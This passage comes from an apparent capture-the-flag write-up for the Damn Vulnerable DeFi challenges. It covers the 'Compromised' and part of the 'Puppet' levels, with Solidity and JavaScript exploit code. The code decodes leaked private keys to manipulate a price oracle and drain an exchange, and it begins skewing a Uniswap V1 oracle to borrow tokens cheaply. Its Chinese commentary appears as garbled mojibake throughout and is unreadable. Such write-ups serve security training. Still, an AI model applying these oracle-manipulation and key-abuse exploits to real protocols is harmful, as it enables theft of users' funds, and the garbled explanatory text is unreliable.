<span class="w">    </span><span class="nx">SelfieHack</span><span class="w"> </span><span class="nx">hack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SelfieHack</span><span class="p">();</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">actionId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">hack</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">governance</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">));</span>

<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>

<span class="w">    </span><span class="nx">skip</span><span class="p">(</span><span class="nx">governance</span><span class="p">.</span><span class="nx">getActionDelay</span><span class="p">());</span><span class="w"> </span><span class="c1">// 2 days</span>
<span class="w">    </span><span class="nx">governance</span><span class="p">.</span><span class="nx">executeAction</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="7-compromised">7. Compromised<a class="headerlink" href="#7-compromised" title="Permanent link">&para;</a></h2>
<blockquote>
<p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here‚Äôs a snippet:</p>
</blockquote>
<div class="highlight"><pre><span></span><code>HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
</code></pre></div>
<blockquote>
<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called ‚ÄúDVNFT‚Äù, now at 999 ETH each.</p>
<p>This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.</p>
<p>Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.</p>
</blockquote>
<ul>
<li>ÂØπËøîÂõûÊï∞ÊçÆÂÖàÂçÅÂÖ≠ËøõÂà∂Ëß£Á†ÅÂÜç Base64 Ëß£Á†ÅÂæóÂà∞ÂÖ∂‰∏≠‰∏§‰∏™ reporter ÁöÑÁßÅÈí•</li>
<li>
<p>DVNFT ÁöÑ‰ª∑Ê†ºÂèñÂÜ≥‰∫é reporters Êèê‰æõ‰ª∑Ê†ºÁöÑ‰∏≠‰ΩçÊï∞</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">getMedianPrice</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_computeMedianPrice</span><span class="p">(</span><span class="nx">symbol</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">_computeMedianPrice</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">prices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getAllPricesForSymbol</span><span class="p">(</span><span class="nx">symbol</span><span class="p">);</span>
<span class="w">    </span><span class="nx">LibSort</span><span class="p">.</span><span class="nx">insertionSort</span><span class="p">(</span><span class="nx">prices</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">prices</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">leftPrice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">prices</span><span class="p">[(</span><span class="nx">prices</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">rightPrice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">prices</span><span class="p">[</span><span class="nx">prices</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">];</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">leftPrice</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">rightPrice</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">prices</span><span class="p">[</span><span class="nx">prices</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">];</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">getAllPricesForSymbol</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">prices</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">numberOfSources</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getRoleMemberCount</span><span class="p">(</span><span class="nx">TRUSTED_SOURCE_ROLE</span><span class="p">);</span>
<span class="w">    </span><span class="nx">prices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">uint256</span><span class="p">[](</span><span class="nx">numberOfSources</span><span class="p">);</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">numberOfSources</span><span class="p">;)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getRoleMember</span><span class="p">(</span><span class="nx">TRUSTED_SOURCE_ROLE</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span><span class="p">);</span>
<span class="w">        </span><span class="nx">prices</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getPriceBySource</span><span class="p">(</span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">source</span><span class="p">);</span>
<span class="w">        </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">getPriceBySource</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">source</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_pricesBySource</span><span class="p">[</span><span class="nx">source</span><span class="p">][</span><span class="nx">symbol</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>Âú®ÊåÅÊúâ‰∏§‰∏™ reporters ÁßÅÈí•ÁöÑÊÉÖÂÜµ‰∏ãÂèØ‰ª•ÂæàËΩªÊùæÂú∞ÊìçÊéß‰ª∑Ê†º</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">postPrice</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">newPrice</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyRole</span><span class="p">(</span><span class="nx">TRUSTED_SOURCE_ROLE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">_setPrice</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">symbol</span><span class="p">,</span><span class="w"> </span><span class="nx">newPrice</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>ÂÖàÈôç‰Ωé‰ª∑Ê†ºË¥≠‰π∞ DVNFTÔºåÂÜçÊèêÈ´ò‰ª∑Ê†ºÂçñÂá∫</p>
</li>
</ul>
<h3 id="exploit_4">Exploit<a class="headerlink" href="#exploit_4" title="Permanent link">&para;</a></h3>
<h4 id="hardhat_2">Hardhat<a class="headerlink" href="#hardhat_2" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s1">&#39;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="p">];</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">signers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">signers</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">Wallet</span><span class="p">(</span>
<span class="w">            </span><span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">resp</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;hex&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;base64&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">),</span>
<span class="w">            </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">provider</span>
<span class="w">        </span><span class="p">));</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">oracle</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">signers</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nx">postPrice</span><span class="p">(</span><span class="s1">&#39;DVNFT&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// get tokenId from the event</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">tx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">exchange</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">buyOne</span><span class="p">({</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="p">});</span><span class="w"> </span><span class="c1">// (msg.value - price) will be send back</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">receipt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">wait</span><span class="p">();</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">receipt</span><span class="p">.</span><span class="nx">events</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span>
<span class="w">        </span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="k">return</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">event</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;TokenBought&quot;</span><span class="p">}</span>
<span class="w">        </span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">args</span><span class="p">.</span><span class="nx">tokenId</span><span class="p">;</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">oracle</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">signers</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nx">postPrice</span><span class="p">(</span><span class="s1">&#39;DVNFT&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">EXCHANGE_INITIAL_ETH_BALANCE</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">nftToken</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">exchange</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">id</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">exchange</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">sellOne</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div>
<h4 id="foundry_2">Foundry<a class="headerlink" href="#foundry_2" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
<span class="w">    </span><span class="nx">users</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vm</span><span class="p">.</span><span class="nx">addr</span><span class="p">(</span><span class="mh">0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span><span class="p">);</span>
<span class="w">    </span><span class="nx">users</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vm</span><span class="p">.</span><span class="nx">addr</span><span class="p">(</span><span class="mh">0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</span><span class="p">);</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
<span class="w">        </span><span class="nx">oracle</span><span class="p">.</span><span class="nx">postPrice</span><span class="p">(</span><span class="s1">&#39;DVNFT&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exchange</span><span class="p">.</span><span class="nx">buyOne</span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="p">}();</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint8</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">users</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
<span class="w">        </span><span class="nx">oracle</span><span class="p">.</span><span class="nx">postPrice</span><span class="p">(</span><span class="s1">&#39;DVNFT&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">EXCHANGE_INITIAL_ETH_BALANCE</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>
<span class="w">    </span><span class="nx">nftToken</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">exchange</span><span class="p">),</span><span class="w"> </span><span class="nx">id</span><span class="p">);</span>
<span class="w">    </span><span class="nx">exchange</span><span class="p">.</span><span class="nx">sellOne</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="8-puppet">8. Puppet<a class="headerlink" href="#8-puppet" title="Permanent link">&para;</a></h2>
<blockquote>
<p>There‚Äôs a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p>
<p>There‚Äôs a DVT market opened in an old <a href="https://docs.uniswap.org/contracts/v1/overview">Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in liquidity.</p>
<p>Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.</p>
</blockquote>
<ul>
<li>
<p>‰ªé <code>PuppetPool</code> ÂÄüÂá∫ token ÈúÄË¶Å deposit ‰∏ÄÂÆöÊï∞ÈáèÁöÑ ETHÔºåÁî± <code>calculateDepositRequired()</code> ÂÜ≥ÂÆöÔºåËÄå <code>depositRequired</code> ÁöÑËÆ°ÁÆóÂü∫‰∫é UniswapV1Pair ÁöÑÂÆûÊó∂‰ΩôÈ¢ù</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">calculateDepositRequired</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">_computeOraclePrice</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">DEPOSIT_FACTOR</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mf">18</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">_computeOraclePrice</span><span class="p">()</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// calculates the price of the token in wei according to Uniswap pair</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">uniswapPair</span><span class="p">.</span><span class="nx">balance</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">10</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mf">18</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">uniswapPair</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>Uniswap V1 ‰∏çÊîØÊåÅ Flash swapÔºåÂèØ‰ª•Âú® borrow Ââç swap Êù•Èôç‰Ωé <code>uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair)</code>Ôºå‰ªéËÄå‰ª•‰Ωé‰ª∑ÂÄüÂá∫ token</p>
</li>
<li>
<p><code>player</code> Âè™ËÉΩÊâßË°å‰∏Ä‰∏™‰∫§ÊòìÔºåËÄå <code>DamnValuableToken</code> ÊîØÊåÅ <code>permit</code>ÔºåÂõ†Ê≠§‰∏çÈúÄË¶ÅÈ¢ùÂ§ñÁöÑ‰∫§ÊòìÊù•Ë∞ÉÁî® <code>approve()</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">expect</span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">provider</span><span class="p">.</span><span class="nx">getTransactionCount</span><span class="p">(</span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">)).</span><span class="nx">to</span><span class="p">.</span><span class="nx">eq</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
</code></pre></div>
</li>
</ul>
<h3 id="exploit_5">Exploit<a class="headerlink" href="#exploit_5" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="kr">interface</span><span class="w"> </span><span class="nx">UniswapExchangeInterface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">tokenToEthSwapInput</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">tokens_sold</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">min_eth</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">deadline</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">eth_bought</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">PuppetPoolHack</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_pool</span><span class="p">,</span><span class="w"> </span><span class="nx">uint8</span><span class="w"> </span><span class="nx">v</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">deadline</span><span class="p">)</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">PuppetPool</span><span class="w"> </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">PuppetPool</span><span class="p">(</span><span class="nx">_pool</span><span class="p">);</span>
<span class="w">        </span><span class="nx">DamnValuableToken</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">DamnValuableToken</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">token</span><span class="p">());</span>
<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">permit</span><span class="p">(</span>
<span class="w">            </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span>
<span class="w">            </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
<span class="w">            </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span>
<span class="w">            </span><span class="nx">deadline</span><span class="p">,</span>
<span class="w">            </span><span class="nx">v</span><span class="p">,</span>
<span class="w">            </span><span class="nx">r</span><span class="p">,</span>
<span class="w">            </span><span class="nx">s</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
